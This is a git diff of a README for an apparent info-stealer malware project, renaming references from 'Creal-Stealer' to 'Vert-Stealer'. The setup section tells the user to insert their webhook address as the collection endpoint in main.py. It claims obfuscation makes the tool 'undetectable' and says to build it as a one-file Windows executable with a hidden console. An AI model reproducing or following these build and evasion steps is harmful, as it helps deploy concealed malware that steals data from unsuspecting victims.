@@ -26,7 +26,7 @@
 
 ## Setup:
  
-First paste and save your webhook address instead of `"WEBHOOK HERE"` in Creal.py
+First paste and save your webhook address instead of `"WEBHOOK HERE"` in main.py
 
 If you use obfuscator it will be undetectable.
 
@@ -38,7 +38,7 @@ And after installed `python -m auto_py_to_exe`
 
 Browse file Select `One file and Windows Based (hide the console)`
 
-<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/pyy.png"></img>
+<img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://raw.githubusercontent.com/VertX00D/Vert-Stealer/main/images/vertimages4.png"></img>
 
 And press covert .py .exe
 
